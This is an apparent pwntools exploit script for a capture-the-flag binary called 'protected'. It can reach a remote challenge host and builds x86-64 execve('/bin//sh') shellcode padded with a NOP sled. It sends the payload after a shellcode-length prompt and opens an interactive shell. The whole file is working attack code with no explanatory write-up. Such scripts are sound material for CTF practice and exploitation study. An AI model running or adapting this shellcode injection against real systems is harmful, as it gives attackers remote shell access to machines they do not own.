from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./protected"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("he-protecc.challs.cornc.tf", 1337, ssl=True)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()
shellcode = asm(
"""
    xor rax, rax
    push rax      
    mov rbx, 0x68732f6e69622f2f 
    push rbx
    mov rdi, rsp 
    xor rsi, rsi 
    xor rdx, rdx 
    mov rax, 59  
    syscall
""")

nop_sled = b'\x90' * (0x1000 - len(shellcode))

payload = nop_sled + shellcode
log.success(disasm(shellcode))

io.sendlineafter("How long is your shellcode?\n", str(len(payload)))
ddebug("b *0x04033CA\n b *0x500fe0\n continue")
io.sendline(payload)

io.interactive()
